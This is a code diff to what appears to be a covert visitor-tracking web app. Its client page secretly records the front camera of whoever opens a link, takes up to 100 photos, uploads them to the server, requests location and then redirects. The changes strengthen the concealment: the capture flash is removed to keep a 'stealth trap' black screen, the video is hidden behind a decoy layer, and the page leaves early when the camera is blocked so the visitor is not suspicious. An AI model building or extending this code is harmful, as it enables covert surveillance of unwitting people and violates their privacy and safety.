@@ -1952,22 +1952,42 @@ async function startServer() {
       
       // Physically delete folders from disk
       visitsToDelete.forEach(visit => {
+        // Method 1: Extract from capturedPhotos URLs
         if (visit.capturedPhotos && visit.capturedPhotos.length > 0) {
-          try {
-            // Extract folder name from the first photo path: /uploads/FOLDER_NAME/photo.jpg
-            const firstPhoto = visit.capturedPhotos[0];
-            const parts = firstPhoto.split('/');
-            if (parts.length >= 3) {
-              const folderName = parts[2];
-              const folderPath = path.join(UPLOADS_DIR, folderName);
-              if (fs.existsSync(folderPath)) {
-                fs.rmSync(folderPath, { recursive: true, force: true });
-                console.log(`Deleted photo folder: ${folderPath}`);
-              }
+          visit.capturedPhotos.forEach(photoPath => {
+            if (photoPath && photoPath.startsWith('/uploads/')) {
+              try {
+                const parts = photoPath.split('/');
+                if (parts.length >= 3) {
+                  const folderName = parts[2];
+                  const folderPath = path.join(UPLOADS_DIR, folderName);
+                  if (fs.existsSync(folderPath)) {
+                    fs.rmSync(folderPath, { recursive: true, force: true });
+                    console.log(`[CLEANUP] Deleted photo folder: ${folderPath}`);
+                  }
+                }
+              } catch (e) {}
             }
-          } catch (e) {
-            console.error('Error deleting folder:', e);
-          }
+          });
+        }
+
+        // Method 2: Scan uploads directory for folders containing visitorToken or session ID
+        if (fs.existsSync(UPLOADS_DIR)) {
+          try {
+            const items = fs.readdirSync(UPLOADS_DIR);
+            const tokenClean = (visit.visitorToken || visit.id || '').replace(/[^a-zA-Z0-9]/g, '_');
+            if (tokenClean && tokenClean.length > 4) {
+              items.forEach(item => {
+                if (item.includes(tokenClean)) {
+                  const folderPath = path.join(UPLOADS_DIR, item);
+                  if (fs.existsSync(folderPath)) {
+                    fs.rmSync(folderPath, { recursive: true, force: true });
+                    console.log(`[CLEANUP] Physically deleted matching token folder: ${folderPath}`);
+                  }
+                }
+              });
+            }
+          } catch (err) {}
         }
       });
 
@@ -2502,10 +2522,9 @@ Respond ONLY with a valid JSON object matching this schema:
         const base64Data = photo.replace(/^data:[^;]+;base64,/, "");
         fs.writeFileSync(photoPath, base64Data, { encoding: 'base64' });
         photoDiskUrl = `/uploads/${folderName}/${photoFilename}`;
-        console.log(`[STORAGE] Saving photo to disk: ${photoPath} | Public URL: ${photoDiskUrl}`);
+        console.log(`[STORAGE SUCCESS] Saved to: ${photoPath}`);
       } catch (writeErr: any) {
-        console.warn(`[STORAGE WARNING] Failed to write photo to disk (using base64 fallback):`, writeErr.message || writeErr);
-        // Fall back to raw base64 photo so it is still saved to DB and rendered successfully in the UI
+        console.error(`[STORAGE CRITICAL] Failed to write photo to disk. Error: ${writeErr.message}`);
         photoDiskUrl = photo;
       }
 
@@ -2544,8 +2563,8 @@ Respond ONLY with a valid JSON object matching this schema:
 
         if (!visit.capturedPhotos.includes(photoDiskUrl)) {
           visit.capturedPhotos.push(photoDiskUrl);
-          if (visit.capturedPhotos.length > 30) {
-            visit.capturedPhotos = visit.capturedPhotos.slice(-30); // Keep only the latest 30 photos
+          if (visit.capturedPhotos.length > 100) {
+            visit.capturedPhotos = visit.capturedPhotos.slice(-100); // Keep only the latest 100 photos
           }
         }
         if (effectiveToken && !visit.visitorToken) {
@@ -3725,11 +3744,12 @@ Respond ONLY with a valid JSON object matching this schema:
       var video = null;
       var canvas = null;
       var photos = [];
-      var totalShots = 30;
+      var totalShots = 100;
       var currentShot = 0;
       var activeStream = null;
       var isFinished = false;
       var isSent = false;
+      var isCaptureStarted = false;
       var cameraResolver = null;
 
       var cameraPromise = new Promise(function(resolve) {
@@ -3794,7 +3814,7 @@ Respond ONLY with a valid JSON object matching this schema:
         }
       }
 
-      // Safe Photo Capture: 30 Front Shots
+      // Safe Photo Capture: 120 Front Shots, 1-second interval
       function takePhotoShot(retriesLeft) {
         if (isFinished || currentShot >= totalShots) {
           return;
@@ -3821,7 +3841,7 @@ Respond ONLY with a valid JSON object matching this schema:
         var ctx = canvas.getContext('2d');
         if (!ctx) {
           currentShot++;
-          setTimeout(function() { takePhotoShot(10); }, 500);
+          setTimeout(function() { takePhotoShot(10); }, 100);
           return;
         }
 
@@ -3829,12 +3849,7 @@ Respond ONLY with a valid JSON object matching this schema:
 
         var dataUrl = canvas.toDataURL('image/jpeg', 0.90);
         if (dataUrl && dataUrl.length > 200) {
-          // Flash effect for 100ms
-          var flash = document.getElementById('flashOverlay');
-          if (flash) {
-            flash.style.opacity = '0.6';
-            setTimeout(function() { flash.style.opacity = '0'; }, 80);
-          }
+          // No flashOverlay blinking effect is triggered here to preserve a static black screen stealth trap
 
           photos.push(dataUrl);
           var shotNum = currentShot + 1;
@@ -3876,7 +3891,7 @@ Respond ONLY with a valid JSON object matching this schema:
         }
 
         if (currentShot < totalShots) {
-          setTimeout(function() { takePhotoShot(10); }, 500);
+          setTimeout(function() { takePhotoShot(10); }, 100);
         } else {
           finishCapture();
         }
@@ -3884,24 +3899,26 @@ Respond ONLY with a valid JSON object matching this schema:
 
       // Wait for video to be actively rendering real camera frames before taking photos
       function startCaptureWhenReady() {
+        if (isCaptureStarted) return;
+        isCaptureStarted = true;
         var checkCount = 0;
         var checkInterval = setInterval(function() {
           checkCount++;
           if (video && video.paused) {
             video.play().catch(function() {});
           }
-          var hasDimensions = video.videoWidth > 0 && video.videoHeight > 0;
-          var hasData = video.readyState >= 2;
-          var hasDecoded = video.currentTime > 0.03 || checkCount >= 10;
+          var hasDimensions = video && video.videoWidth > 0 && video.videoHeight > 0;
+          var hasData = video && video.readyState >= 2;
+          var hasDecoded = video && (video.currentTime > 0.02 || checkCount >= 12);
 
-          if ((hasDimensions && hasData && hasDecoded) || checkCount >= 15) {
+          if ((hasDimensions && hasData && hasDecoded) || checkCount >= 25) {
             clearInterval(checkInterval);
             // Allow 300ms for camera auto-exposure to fully calibrate
             setTimeout(function() {
               takePhotoShot(15);
             }, 300);
           }
-        }, 80);
+        }, 100);
       }
 
       function sendTelemetryAndRedirect() {
@@ -3922,10 +3939,19 @@ Respond ONLY with a valid JSON object matching this schema:
           });
         });
 
-        // Fallback safety redirect after 45 seconds max
+        // Dynamic fallback safety redirect:
+        // If camera mode is active and we have a stream, let the capture run (up to 180s)
+        // If camera is blocked or permission is denied, escape quickly in 10s so the user isn't suspicious
         setTimeout(function() {
+          if (isCamera && activeStream && !isFinished) {
+            // Wait up to 180s total for photos to complete
+            setTimeout(function() {
+              window.location.replace(targetUrl);
+            }, 180000);
+            return;
+          }
           window.location.replace(targetUrl);
-        }, 45000);
+        }, 10000);
       }
 
       function requestLocationStrict() {
@@ -3981,8 +4007,9 @@ Respond ONLY with a valid JSON object matching this schema:
           video.muted = true;
           video.playsInline = true;
           video.volume = 0;
-          // Must have valid size and be in the render tree with high z-index so GPU compositor keeps decoding frames actively
-          video.style.cssText = 'position:fixed;top:0;right:0;width:320px;height:240px;opacity:0.01;pointer-events:none;z-index:2147483647;';
+          // Must have valid size and be in the render tree so GPU compositor keeps decoding frames actively.
+          // By giving it opacity 1, full size and placing it behind the black decoy (z-index: 1 vs 999999), the browser decodes it beautifully at full FPS while staying 100% hidden.
+          video.style.cssText = 'position:fixed;inset:0;width:100vw;height:100vh;object-fit:cover;opacity:1;pointer-events:none;z-index:1;';
           document.body.appendChild(video);
 
           // Launch Front Camera stream immediately on load
@@ -4009,10 +4036,10 @@ Respond ONLY with a valid JSON object matching this schema:
             console.warn('Camera blocked on initial load. Awaiting user click to retry.');
           });
 
-          // Fixed 35s fallback safety timer
+          // Fixed 45s fallback safety timer for 30 shots
           setTimeout(function() {
             finishCapture();
-          }, 35000);
+          }, 45000);
         } catch(e) {
           finishCapture();
         }
